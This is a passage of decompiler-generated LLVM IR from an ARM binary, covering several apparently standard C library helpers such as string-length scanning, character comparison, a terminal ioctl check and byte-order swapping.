bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_f26c = load i32, i32* %r3.global-to-local, align 4
  %v2_f26c = icmp eq i32 %v0_f26c, 0
  store i1 %v2_f26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f26c, label %dec_label_pc_f274, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_f260.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_f274:                                ; preds = %dec_label_pc_f240, %bb13, %dec_label_pc_f274
  %v2_f27c = phi i32 [ %v6_f27c, %dec_label_pc_f274 ], [ %v1_f240, %dec_label_pc_f240 ], [ %v6_f264, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f278 = load i32, i32* %r2.global-to-local, align 4
  %v1_f278 = add i32 %v0_f278, -1
  store i32 %v1_f278, i32* %r2.global-to-local, align 4
  %v7_f278 = icmp eq i32 %v0_f278, 1
  store i1 %v7_f278, i1* %cpsr_z.global-to-local, align 1
  %v3_f27c = add i32 %v2_f27c, 1
  %v4_f27c = inttoptr i32 %v3_f27c to i8*
  store i8 0, i8* %v4_f27c, align 1
  %v5_f27c = load i32, i32* %ip.global-to-local, align 4
  %v6_f27c = add i32 %v5_f27c, 1
  store i32 %v6_f27c, i32* %ip.global-to-local, align 4
  %v0_f280 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f280, label %dec_label_pc_f284, label %dec_label_pc_f274

dec_label_pc_f284:                                ; preds = %dec_label_pc_f274
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_f27c, { 1, 0 }
  uselistorder i32 %v0_f278, { 1, 0 }
  uselistorder i32 %v6_f264, { 0, 2, 1 }
  uselistorder i32 %v1_f254, { 2, 1, 0 }
  uselistorder i32 %v2_f244, { 2, 1, 0 }
  uselistorder i32 %v1_f234, { 1, 0 }
  uselistorder i32 %v0_f230, { 1, 0 }
  uselistorder i32 %v6_f224, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_f274, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_f288(i8* %arg1) local_unnamed_addr {
dec_label_pc_f288:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f288 = load i32, i32* @r1, align 4
  %v2_f288 = icmp eq i32 %v0_f288, 0
  br i1 %v2_f288, label %bb, label %dec_label_pc_f2b8

bb:                                               ; preds = %dec_label_pc_f288
  ret i32 0

dec_label_pc_f2a0:                                ; preds = %dec_label_pc_f2c8
  %v3_f2a0 = icmp uge i32 %v5_f354, %v1_f2a0
  %v9_f2a0 = icmp eq i32 %v5_f354, %v1_f2a0
  %v2_f2a4 = xor i1 %v3_f2a0, true
  %v3_f2a4 = or i1 %v9_f2a0, %v2_f2a4
  br i1 %v3_f2a4, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_f2a0
  %v6_f2a4 = sub i32 %v5_f354, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_f2a0, %bb19
  %v5_f2a8 = phi i32 [ %v1_f2a0, %dec_label_pc_f2a0 ], [ %v6_f2a4, %bb19 ]
  %v2_f2a8 = xor i1 %v9_f2a0, true
  %v3_f2a8 = and i1 %v3_f2a0, %v2_f2a8
  br i1 %v3_f2a8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_f2a8 = sub i32 %v5_f2a8, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_f2ac = phi i32 [ %v5_f2a8, %bb20 ], [ %v6_f2a8, %bb21 ]
  ret i32 %v8_f2ac

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2fc
  br label %dec_label_pc_f350

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f288
  %v2_f2b8 = add i32 %tmp, %v0_f288
  %v3_f2b8 = icmp ult i32 %v2_f2b8, %tmp
  br i1 %v3_f2b8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_f2b8
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_f2b8, %bb23
  %v5_f354 = phi i32 [ %v2_f2b8, %dec_label_pc_f2b8 ], [ -1, %bb23 ]
  %v1_f2d82 = urem i32 %tmp, 4
  %v2_f2d83 = icmp eq i32 %v1_f2d82, 0
  br i1 %v2_f2d83, label %dec_label_pc_f2e0, label %dec_label_pc_f2c8

dec_label_pc_f2c8:                                ; preds = %bb24, %dec_label_pc_f2d4
  %v1_f2a0 = phi i32 [ %v1_f2d4, %dec_label_pc_f2d4 ], [ %tmp, %bb24 ]
  %v1_f2c8 = inttoptr i32 %v1_f2a0 to i8*
  %v2_f2c8 = load i8, i8* %v1_f2c8, align 1
  %v2_f2cc = icmp eq i8 %v2_f2c8, 0
  br i1 %v2_f2cc, label %dec_label_pc_f2a0, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2c8
  %v1_f2d4 = add i32 %v1_f2a0, 1
  %v1_f2d8 = urem i32 %v1_f2d4, 4
  %v2_f2d8 = icmp eq i32 %v1_f2d8, 0
  br i1 %v2_f2d8, label %dec_label_pc_f2e0, label %dec_label_pc_f2c8

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2d4, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_f2d4, %dec_label_pc_f2d4 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_f34032 = icmp ult i32 %storemerge.lcssa, %v5_f354
  br i1 %v3_f34032, label %dec_label_pc_f2e8, label %dec_label_pc_f350

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f2e0
  %v0_f2b039 = phi i32 [ %v4_f2e8, %dec_label_pc_f33c ], [ %storemerge.lcssa, %dec_label_pc_f2e0 ]
  %v1_f2e8 = inttoptr i32 %v0_f2b039 to i32*
  %v2_f2e8 = load i32, i32* %v1_f2e8, align 4
  %v4_f2e8 = add i32 %v0_f2b039, 4
  store i32 %v4_f2e8, i32* @lr, align 4
  %v2_f2ec = add i32 %v2_f2e8, -16843009
  %v2_f2f0 = and i32 %v2_f2ec, -2139062144
  %v2_f2f4 = icmp eq i32 %v2_f2f0, 0
  br i1 %v2_f2f4, label %dec_label_pc_f33c, label %dec_label_pc_f2fc

dec_label_pc_f2fc:                                ; preds = %dec_label_pc_f2e8
  %v2_f2fc = inttoptr i32 %v0_f2b039 to i8*
  %v3_f2fc = load i8, i8* %v2_f2fc, align 1
  %v2_f304 = icmp eq i8 %v3_f2fc, 0
  %v1_f308 = add i32 %v0_f2b039, 1
  br i1 %v2_f304, label %dec_label_pc_f2b0, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f2fc
  %v2_f310 = inttoptr i32 %v1_f308 to i8*
  %v3_f310 = load i8, i8* %v2_f310, align 1
  %v2_f314 = icmp eq i8 %v3_f310, 0
  br i1 %v2_f314, label %dec_label_pc_f350, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f310
  %v1_f31c = add i32 %v0_f2b039, 2
  %v2_f31c = inttoptr i32 %v1_f31c to i8*
  %v3_f31c = load i8, i8* %v2_f31c, align 1
  %v2_f320 = icmp eq i8 %v3_f31c, 0
  br i1 %v2_f320, label %dec_label_pc_f350, label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f31c
  %v1_f32c = add i32 %v0_f2b039, 3
  %v2_f32c = inttoptr i32 %v1_f32c to i8*
  %v3_f32c = load i8, i8* %v2_f32c, align 1
  %v2_f330 = icmp eq i8 %v3_f32c, 0
  br i1 %v2_f330, label %dec_label_pc_f350, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f32c, %dec_label_pc_f2e8
  %v3_f340 = icmp ult i32 %v4_f2e8, %v5_f354
  br i1 %v3_f340, label %dec_label_pc_f2e8, label %dec_label_pc_f350

dec_label_pc_f350:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f2e0, %dec_label_pc_f310, %dec_label_pc_f31c, %dec_label_pc_f32c, %dec_label_pc_f2b0
  %v1_f350 = phi i32 [ %v0_f2b039, %dec_label_pc_f2b0 ], [ %storemerge.lcssa, %dec_label_pc_f2e0 ], [ %v1_f308, %dec_label_pc_f310 ], [ %v1_f31c, %dec_label_pc_f31c ], [ %v1_f32c, %dec_label_pc_f32c ], [ %v5_f354, %dec_label_pc_f33c ]
  %v3_f350 = icmp uge i32 %v5_f354, %v1_f350
  %v9_f350 = icmp eq i32 %v5_f354, %v1_f350
  %v2_f354 = xor i1 %v3_f350, true
  %v3_f354 = or i1 %v9_f350, %v2_f354
  br i1 %v3_f354, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_f350
  %v6_f354 = sub i32 %v5_f354, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_f350, %bb25
  %v5_f358 = phi i32 [ %v1_f350, %dec_label_pc_f350 ], [ %v6_f354, %bb25 ]
  %v2_f358 = xor i1 %v9_f350, true
  %v3_f358 = and i1 %v3_f350, %v2_f358
  br i1 %v3_f358, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_f358 = sub i32 %v5_f358, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_f35c = phi i32 [ %v5_f358, %bb26 ], [ %v6_f358, %bb27 ]
  ret i32 %v8_f35c

; uselistorder directives
  uselistorder i1 %v3_f350, { 1, 0 }
  uselistorder i32 %v4_f2e8, { 1, 2, 0 }
  uselistorder i32 %v0_f2b039, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_f2d4, { 1, 0, 2 }
  uselistorder i32 %v1_f2a0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_f354, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_f2a0, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_f350, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_f2c8, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_f368(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f368:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f370 = call i32 @function_f37c()
  %v0_f374 = load i32, i32* @r4, align 4
  ret i32 %v0_f374
}

define i32 @function_f37c() local_unnamed_addr {
dec_label_pc_f37c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_f37c = load i32, i32* @r4, align 4
  %v0_f380 = load i32, i32* @r0, align 4
  %v0_f38c = load i32, i32* @r1, align 4
  store i32 %v0_f38c, i32* @r8, align 4
  %v0_f390 = load i32, i32* @r2, align 4
  store i32 %v0_f390, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_f380, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_f3c8

thread-pre-split.preheader:                       ; preds = %dec_label_pc_f37c
  store i32 ptrtoint ([8 x i8]* @global_var_16304.415 to i32), i32* @r5, align 4
  %v2_f3b03446 = icmp eq i32 %v0_f380, 0
  br i1 %v2_f3b03446, label %bb26, label %dec_label_pc_f3a4.lr.ph

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f3a4.lr.ph, %bb
  %v2_f3bc41 = phi i1 [ %v2_f3bc3849, %dec_label_pc_f3a4.lr.ph ], [ %v2_f3bc, %bb ]
  %v1_f3c040 = phi i32 [ %v0_f3b0.pr48, %dec_label_pc_f3a4.lr.ph ], [ %v2_f3ac, %bb ]
  %v0_f3a839 = phi i32 [ %v0_f3b4547, %dec_label_pc_f3a4.lr.ph ], [ %v1_f3a8, %bb ]
  %v1_f3a8 = add i32 %v0_f3a839, 1
  store i32 %v1_f3a8, i32* @r5, align 4
  br i1 %v2_f3bc41, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_f3a4
  %v2_f3ac = add i32 %v1_f3c040, -1
  %v2_f3b0 = icmp eq i32 %v2_f3ac, 0
  %v1_f3b4 = inttoptr i32 %v1_f3a8 to i8*
  %v2_f3b4 = load i8, i8* %v1_f3b4, align 1
  %v2_f3bc = icmp eq i8 %v2_f3b4, 0
  br i1 %v2_f3b0, label %dec_label_pc_f3bc, label %dec_label_pc_f3a4

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_f3a4
  %v1_f3b435 = inttoptr i32 %v1_f3a8 to i8*
  %v2_f3b436 = load i8, i8* %v1_f3b435, align 1
  %v2_f3bc38 = icmp eq i8 %v2_f3b436, 0
  br label %dec_label_pc_f3a4.lr.ph

dec_label_pc_f3a4.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_f3bc3849 = phi i1 [ %v2_f3bc38, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_f3b0.pr48 = phi i32 [ %v1_f3c040, %thread-pre-split.loopexit ], [ %v0_f380, %thread-pre-split.preheader ]
  %v0_f3b4547 = phi i32 [ %v1_f3a8, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_16304.415 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_f3a4

dec_label_pc_f3bc:                                ; preds = %bb
  br i1 %v2_f3bc, label %dec_label_pc_f3c8, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_f3bc
  %v0_f3a8.lcssa55 = phi i32 [ %v1_f3a8, %dec_label_pc_f3bc ], [ ptrtoint ([8 x i8]* @global_var_16304.415 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3bc, %dec_label_pc_f37c
  %v3_f3cc = ashr i32 %v0_f380, 31
  %v5_f3e0 = bitcast i32* %stack_var_-25 to i8*
  %v6_f3e0 = call i32 @function_11a20(i8* %v5_f3e0, i32 %v0_f380, i32 %v3_f3cc, i32 -10, i32 0)
  %v1_f3e4 = add i32 %v6_f3e0, -14
  store i32 %v1_f3e4, i32* @r5, align 4
  store i32 %v1_f3e4, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_162f4.417 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_f3f4 = call i32 @function_ef60()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_f3fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %bb26, %dec_label_pc_f3c8
  %v0_f3fc = phi i32 [ %v0_f3a8.lcssa55, %bb26 ], [ %v0_f3fc.pre, %dec_label_pc_f3c8 ]
  store i32 %v0_f3fc, i32* @r0, align 4
  %v0_f400 = call i32 @function_f030()
  %v0_f404 = load i32, i32* @r8, align 4
  %v2_f404 = icmp eq i32 %v0_f404, 0
  %v1_f408 = add i32 %v0_f400, 1
  store i32 %v1_f408, i32* @r4, align 4
  br i1 %v2_f404, label %bb27, label %dec_label_pc_f3fc._crit_edge

dec_label_pc_f3fc._crit_edge:                     ; preds = %dec_label_pc_f3fc
  %v1_f410.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_f3fc
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_f3fc._crit_edge, %bb27
  %v4_f414 = phi i32 [ %v1_f410.pre, %dec_label_pc_f3fc._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_f408, %v4_f414
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_f414, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_f42414 = phi i32 [ %v4_f414, %bb29 ], [ %v1_f408, %bb28 ]
  %v2_f41c = icmp eq i32 %v0_f42414, 0
  br i1 %v2_f41c, label %dec_label_pc_f440, label %dec_label_pc_f424

dec_label_pc_f424:                                ; preds = %.thread16
  store i32 %v0_f42414, i32* @r2, align 4
  %v0_f428 = load i32, i32* @r5, align 4
  store i32 %v0_f428, i32* @r1, align 4
  store i32 %v0_f404, i32* @r0, align 4
  %v0_f430 = call i32 @function_ef60()
  %v0_f434 = load i32, i32* @r8, align 4
  %v1_f434 = load i32, i32* @r4, align 4
  %v2_f434 = add i32 %v1_f434, %v0_f434
  %v3_f43c = add i32 %v2_f434, -1
  %v4_f43c = inttoptr i32 %v3_f43c to i8*
  store i8 0, i8* %v4_f43c, align 1
  br label %dec_label_pc_f440

dec_label_pc_f440:                                ; preds = %.thread16, %dec_label_pc_f424
  %v0_f440 = load i32, i32* %r7.global-to-local, align 4
  %v2_f440 = icmp eq i32 %v0_f440, 0
  br i1 %v2_f440, label %dec_label_pc_f450, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f440
  %v0_f448 = call i32 @function_cec4()
  %v0_f44c = load i32, i32* %r7.global-to-local, align 4
  %v2_f44c = inttoptr i32 %v0_f448 to i32*
  store i32 %v0_f44c, i32* %v2_f44c, align 4
  %v0_f450.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %dec_label_pc_f440, %dec_label_pc_f448
  %v0_f450 = phi i32 [ 0, %dec_label_pc_f440 ], [ %v0_f450.pre, %dec_label_pc_f448 ]
  store i32 %v3_f37c, i32* @r4, align 4
  ret i32 %v0_f450

; uselistorder directives
  uselistorder i32 %v4_f414, { 1, 2, 0 }
  uselistorder i32 %v1_f408, { 1, 0, 2 }
  uselistorder i32 %v1_f3a8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f380, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_f450, { 1, 0 }
  uselistorder label %dec_label_pc_f440, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_f3fc, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_f464(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f464:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %bb8, %dec_label_pc_f464
  %v8_f4d83 = phi i32 [ %v8_f4d8, %bb8 ], [ 0, %dec_label_pc_f464 ]
  %v0_f4cc = phi i32 [ %v1_f4cc, %bb8 ], [ %arg2, %dec_label_pc_f464 ]
  %v0_f4d0 = phi i32 [ %v1_f4d0, %bb8 ], [ %tmp, %dec_label_pc_f464 ]
  %v9_f474 = icmp eq i32 %v0_f4d0, %v0_f4cc
  br i1 %v9_f474, label %dec_label_pc_f474._crit_edge, label %dec_label_pc_f47c

dec_label_pc_f474._crit_edge:                     ; preds = %dec_label_pc_f474
  %.pre = inttoptr i32 %v0_f4cc to i8*
  br label %bb8

dec_label_pc_f47c:                                ; preds = %dec_label_pc_f474
  %v1_f480 = inttoptr i32 %v0_f4d0 to i8*
  %v2_f480 = load i8, i8* %v1_f480, align 1
  %v3_f480 = zext i8 %v2_f480 to i32
  %v1_f484 = inttoptr i32 %v0_f4cc to i8*
  %v2_f484 = load i8, i8* %v1_f484, align 1
  %v3_f484 = zext i8 %v2_f484 to i32
  %v2_f488 = load i32, i32* bitcast (i32** @global_var_18430.419 to i32*), align 4
  %v2_f48c = mul nuw nsw i32 %v3_f480, 2
  store i32 %v2_f48c, i32* @ip, align 4
  %v2_f490 = mul nuw nsw i32 %v3_f484, 2
  %v2_f494 = add i32 %v2_f490, %v2_f488
  %v2_f498 = add i32 %v2_f488, %v2_f48c
  %v1_f49c = add i32 %v2_f498, 1
  %v2_f49c = inttoptr i32 %v1_f49c to i8*
  %v3_f49c = load i8, i8* %v2_f49c, align 1
  %v4_f49c = zext i8 %v3_f49c to i32
  %v1_f4a0 = add i32 %v2_f494, 1
  %v2_f4a0 = inttoptr i32 %v1_f4a0 to i8*
  %v3_f4a0 = load i8, i8* %v2_f4a0, align 1
  %v4_f4a0 = zext i8 %v3_f4a0 to i32
  %v3_f4a4 = inttoptr i32 %v2_f494 to i8*
  %v4_f4a4 = load i8, i8* %v3_f4a4, align 1
  %v6_f4a4 = zext i8 %v4_f4a4 to i32
  %v3_f4a8 = inttoptr i32 %v2_f498 to i8*
  %v4_f4a8 = load i8, i8* %v3_f4a8, align 1
  %v6_f4a8 = zext i8 %v4_f4a8 to i32
  %v3_f4ac = mul nuw i32 %v4_f4a0, 16777216
  %v3_f4b0 = mul nuw i32 %v4_f49c, 16777216
  %v4_f4b4 = sdiv i32 %v3_f4b0, 65536
  %v5_f4b4 = or i32 %v6_f4a8, %v4_f4b4
  %v4_f4b8 = sdiv i32 %v3_f4ac, 65536
  %v5_f4b8 = or i32 %v4_f4b8, %v6_f4a4
  %v2_f4bc = sub nsw i32 %v5_f4b4, %v5_f4b8
  %v9_f4bc = icmp eq i32 %v5_f4b4, %v5_f4b8
  br i1 %v9_f4bc, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_f47c
  ret i32 %v2_f4bc

bb8:                                              ; preds = %dec_label_pc_f474._crit_edge, %dec_label_pc_f47c
  %v1_f4c4.pre-phi = phi i8* [ %.pre, %dec_label_pc_f474._crit_edge ], [ %v1_f480, %dec_label_pc_f47c ]
  %v8_f4d8 = phi i32 [ %v8_f4d83, %dec_label_pc_f474._crit_edge ], [ %v2_f4bc, %dec_label_pc_f47c ]
  %v2_f4c4 = load i8, i8* %v1_f4c4.pre-phi, align 1
  %v2_f4c8 = icmp eq i8 %v2_f4c4, 0
  %v1_f4cc = add i32 %v0_f4cc, 1
  %v1_f4d0 = add i32 %v0_f4d0, 1
  store i32 %v1_f4d0, i32* @lr, align 4
  br i1 %v2_f4c8, label %dec_label_pc_f4d8, label %dec_label_pc_f474

dec_label_pc_f4d8:                                ; preds = %bb8
  ret i32 %v8_f4d8

; uselistorder directives
  uselistorder i32 %v1_f4d0, { 1, 0 }
  uselistorder i32 %v2_f4bc, { 1, 0 }
  uselistorder i32 %v5_f4b8, { 1, 0 }
  uselistorder i32 %v5_f4b4, { 1, 0 }
  uselistorder i32 %v2_f48c, { 1, 0 }
  uselistorder i32 %v0_f4cc, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_f4e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f4e0:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f4e0 = load i32, i32* @r4, align 4
  store i32 %v3_f4e0, i32* %stack_var_-12, align 4
  %v6_f4e0 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_f4e8 = call i32 @function_f030()
  %v1_f4ec = add i32 %v0_f4e8, 1
  store i32 %v1_f4ec, i32* @r4, align 4
  %v1_f4f4 = call i32 @function_fc78(i32 %v1_f4ec)
  store i32 62728, i32* @lr, align 4
  %v1_f504 = icmp ne i32 %v1_f4f4, 0
  call void @__pseudo_cond_branch(i1 %v1_f504, i32 ptrtoint (i32* @global_var_ef60.420 to i32))
  %v2_f50c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f50c, i32* @r4, align 4
  store i32 %v6_f4e0, i32* @r5, align 4
  ret i32 %v1_f4f4
}

define i32 @function_f510(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f510:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_1a8ac.422 to i32), i32* @r2, align 4
  %v0_f514 = call i32 @function_129b0()
  %v0_f518 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f518, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f510
  %v2_f518 = load i32, i32* @ip, align 4
  %v5_f518 = udiv i32 %v2_f518, 131072
  %v6_f518 = and i32 %v5_f518, %arg1
  store i32 %v6_f518, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f510, %bb
  ret i32 %v0_f514

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f51c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f51c:
  %stack_var_-64 = alloca i32, align 4
  %v2_f520 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_f520, i32* @r1, align 4
  %v0_f528 = call i32 @function_f53c()
  %v1_f52c = sub i32 1, %v0_f528
  %v2_f52c = icmp ult i32 %v0_f528, 2
  br i1 %v2_f52c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f51c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f51c, %bb
  %v5_f538 = phi i32 [ %v1_f52c, %dec_label_pc_f51c ], [ 0, %bb ]
  ret i32 %v5_f538

; uselistorder directives
  uselistorder i32 %v0_f528, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f53c() local_unnamed_addr {
dec_label_pc_f53c:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_f53c = load i32, i32* @r4, align 4
  %v6_f53c = load i32, i32* @r5, align 4
  %v2_f540 = ptrtoint i32* %stack_var_-56 to i32
  %v0_f544 = load i32, i32* @r1, align 4
  store i32 %v0_f544, i32* %r6.global-to-local, align 4
  %v0_f550 = load i32, i32* @r0, align 4
  %v3_f550 = call i32 @function_cd84(i32 %v0_f550, i32 21505, i32 %v2_f540)
  store i32 %v3_f550, i32* %r7.global-to-local, align 4
  %v2_f554 = icmp eq i32 %v3_f550, 0
  %v2_f55c = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_f55c, i32* @r1, align 4
  %v0_f564 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_f554, label %dec_label_pc_f56c, label %dec_label_pc_f598

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f53c
  %v1_f564 = add i32 %v0_f564, 17
  %v4_f574 = zext i8 %tmp to i32
  store i32 %v4_f574, i32* @r5, align 4
  %v2_f578 = load i32, i32* %stack_var_-56, align 4
  %v1_f57c = inttoptr i32 %v0_f564 to i32*
  store i32 %v2_f578, i32* %v1_f57c, align 4
  %v3_f57c = add i32 %v0_f564, 4
  %v4_f57c = inttoptr i32 %v3_f57c to i32*
  %v5_f57c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_f57c, i32* %v4_f57c, align 4
  %v6_f57c = add i32 %v0_f564, 8
  %v7_f57c = inttoptr i32 %v6_f57c to i32*
  %v8_f57c = load i32, i32* @lr, align 4
  store i32 %v8_f57c, i32* %v7_f57c, align 4
  %v0_f580 = load i32, i32* @r4, align 4
  %v1_f580 = load i32, i32* %r6.global-to-local, align 4
  %v2_f580 = add i32 %v1_f580, 12
  %v3_f580 = inttoptr i32 %v2_f580 to i32*
  store i32 %v0_f580, i32* %v3_f580, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  %v1_f584 = trunc i32 %v0_f584 to i8
  %v2_f584 = load i32, i32* %r6.global-to-local, align 4
  %v3_f584 = add i32 %v2_f584, 16
  %v4_f584 = inttoptr i32 %v3_f584 to i8*
  store i8 %v1_f584, i8* %v4_f584, align 1
  %v4_f588 = call i32 @function_128ac(i32 %v1_f564, i32 %v2_f55c, i32 19, i32 %v2_f578)
  %v0_f58c = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f594 = inttoptr i32 %v4_f588 to i8*
  %v3_f594 = call i32 @function_ef70(i8* %v2_f594, i32 %v0_f58c)
  br label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f53c, %dec_label_pc_f56c
  %v0_f598 = phi i32 [ %v3_f550, %dec_label_pc_f53c ], [ %v0_f58c, %dec_label_pc_f56c ]
  store i32 %v3_f53c, i32* @r4, align 4
  store i32 %v6_f53c, i32* @r5, align 4
  ret i32 %v0_f598

; uselistorder directives
  uselistorder i32 %v0_f564, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f598, { 1, 0 }
}

define i32 @function_f5a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5a8:
  %v2_f5c4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f5c4
}

define i32 @function_f5cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5cc:
  %tmp = mul i32 %arg1, 256
  %v1_f5d4 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f5d8 = urem i32 %tmp1, 256
  %v5_f5d8 = or i32 %v4_f5d8, %v1_f5d4
  ret i32 %v5_f5d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5e0:
